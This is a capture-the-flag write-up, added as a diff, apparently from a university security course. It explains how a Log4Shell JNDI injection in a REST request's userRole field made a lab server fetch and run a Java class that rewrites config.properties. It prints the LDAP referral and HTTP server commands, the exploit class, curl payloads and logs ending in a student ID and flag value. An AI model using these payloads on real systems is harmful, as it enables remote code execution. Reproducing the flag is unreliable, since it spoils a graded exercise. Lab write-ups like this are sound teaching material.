@@ -1,0 +1,113 @@
+Detailed Explanation of How We Got Flag 5
+I'll walk you through a detailed explanation of how we exploited the Log4Shell vulnerability to capture Flag 5.
+Understanding the Challenge
+Flag 5 required us to:
+
+Use the Log4j exploit to overwrite the "config.properties" file
+Change the topic from the default "user.info" to a different topic ("user.account")
+Set our GATECH_ID as the account number in the message
+This would generate the flag when done correctly
+
+Step 1: Finding the Target Topic
+First, we needed to identify the "other topic" mentioned in the instructions. By examining the logs carefully, especially after restarting the container, we found:
+Copy2025-03-08 03:38:39 [Application.java:45] INFO   Setting up subscriber to user.account topic.
+2025-03-08 03:38:39 [Subscriber.java:20] INFO   Received message {"id":"123","userType":"Test Type","user":"Test User","accountNum":"99999"} for topic: user.account
+2025-03-08 03:38:39 [Subscriber.java:41] INFO   Processed message.
+2025-03-08 03:38:39 [Application.java:53] INFO   user.account subscriber is listening.
+This showed that "user.account" was our target topic - the one we needed to publish to.
+Step 2: Setting Up Our Exploit Environment
+We set up our exploit environment consisting of:
+
+The LDAP server to handle the malicious JNDI lookup:
+
+Copyjava -cp ~/Desktop/log4shell/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://172.17.0.1:4242/#Exploit" 1389
+
+The HTTP server to serve our malicious Java class:
+
+Copycd ~/Desktop/log4shell/Flag5
+python3 -m http.server 4242
+Step 3: Creating the Exploit Code
+We wrote a Java exploit that would:
+
+Load the existing properties file
+Change the topic name to "user.account"
+Save the properties back to the file
+
+javaCopyimport java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.util.Properties;
+
+public class Exploit {
+    static {
+        try {
+            System.out.println("Entering exploit...");
+            
+            // Load the existing properties file
+            Properties props = new Properties();
+            FileInputStream in = new FileInputStream("config.properties");
+            props.load(in);
+            in.close();
+            
+            // Update the topic.name property to user.account
+            props.setProperty("topic.name", "user.account");
+            
+            // Save the properties back to the file
+            FileOutputStream out = new FileOutputStream("config.properties");
+            props.store(out, null);
+            out.close();
+            
+            System.out.println("Exploit completed - Changed topic to user.account");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+We compiled this with:
+Copyjavac Exploit.java
+Step 4: Trial and Error - Understanding the Data Flow
+We tried several injection points to understand how the data flowed from our request to the published message:
+
+First, we injected into the userId field in the JSON payload:
+
+Copycurl -X PUT 'http://localhost:8080/rest/users/user' -H 'GATECH_ID:904074283' -H 'Content-Type:application/json' --data-raw '{"id":8,"userId":"${jndi:ldap://172.17.0.1:1389/Exploit}","userName":"RSANCHEZ1","userRole":"R&D","adminYN":"Y"}'
+From the logs we discovered that the userId in the JSON payload was being used as the accountNum in the published message:
+CopyReceived message {"id":"8","userType":"R&D","user":"RSANCHEZ1","accountNum":"${jndi:ldap://172.17.0.1:1389/Exploit}"} for topic: user.account
+But we needed our GATECH_ID to be in the accountNum field to get the flag, so this approach wouldn't work.
+Step 5: The Winning Approach
+By analyzing the logs more carefully, we discovered the pattern:
+
+userId in JSON → accountNum in message
+userRole in JSON → userType in message
+userName in JSON → user in message
+
+This gave us the key insight: we needed to:
+
+Keep our GATECH_ID in the userId field (so it becomes accountNum)
+Put our exploit in the userRole field (so it would still get processed by Log4j)
+
+The successful payload was:
+Copycurl -X PUT 'http://localhost:8080/rest/users/user' -H 'GATECH_ID:904074283' -H 'Content-Type:application/json' --data-raw '{"id":8,"userId":"904074283","userName":"RSANCHEZ1","userRole":"${jndi:ldap://172.17.0.1:1389/Exploit}","adminYN":"Y"}'
+Step 6: Success!
+When we sent this payload:
+
+The Log4j vulnerability was triggered when the server logged the userRole value
+This initiated a JNDI lookup to our LDAP server at 172.17.0.1:1389
+The LDAP server redirected to our HTTP server to download Exploit.class
+Our exploit code ran and changed the topic.name in config.properties to "user.account"
+The message was then published to user.account (instead of user.info)
+The accountNum field contained our GATECH_ID (904074283)
+This combination generated the flag
+
+The logs showed:
+Copy2025-03-08 07:24:29 [UserService.java:70] INFO   *********** Topic read from properties file: user.account  ***********
+2025-03-08 07:24:29 [UserService.java:73] INFO   Publishing to topic: user.account
+2025-03-08 07:24:29 [Subscriber.java:20] INFO   Received message {"id":"8","userType":"${jndi:ldap://172.17.0.1:1389/Exploit}","user":"RSANCHEZ1","accountNum":"904074283"} for topic: user.account
+2025-03-08 07:24:33 [Subscriber.java:30] INFO   Congratulations! Your flag5 is: 70b22a7ee3efcb281d794b6894a34ad56621eefaa9d55cca8cd3dbc2f632b4d3
+Key Insights
+
+Understanding data flow: Seeing how fields in the JSON request mapped to fields in the published message was crucial
+Proper target identification: Finding "user.account" as the target topic
+Strategic injection: Putting our exploit in userRole while preserving GATECH_ID in userId
+Logs analysis: Careful reading of the logs revealed the patterns we needed to exploit
+
+This challenge demonstrated a common pattern in cybersecurity: sometimes we need to understand not just the vulnerability (Log4Shell) but also the specific application logic and data flow to craft a successful exploit.
